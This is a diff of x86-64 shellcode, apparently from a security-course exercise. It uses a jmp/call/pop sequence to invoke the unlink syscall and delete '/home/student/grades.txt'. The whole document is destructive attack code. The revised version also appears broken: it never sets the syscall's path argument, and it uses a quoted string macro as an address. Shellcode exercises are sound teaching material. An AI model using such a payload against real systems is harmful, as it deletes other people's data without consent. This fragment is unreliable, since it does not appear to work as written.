@@ -2,8 +2,6 @@
 
 #define STRING	"/home/student/grades.txt"
 #define STRLEN	24
-#define ARGV	(STRLEN+1)
-#define ENVP	(ARGV+8)
 
 .globl main
 	.type	main, @function
@@ -12,10 +10,9 @@
 	jmp	calladdr
 
  popladdr:
-	movq $24, %rbx
-	movb $0, STRING(%rbx)
-	xorq %rbx, %rbx 
-	leaq STRING(%rbx), %rdi
+	popq %rcx
+	leaq STRING, %rbx
+	addq %rbx, %rcx
 	xorq %rax, %rax
 	movb $SYS_unlink, %al
 	syscall
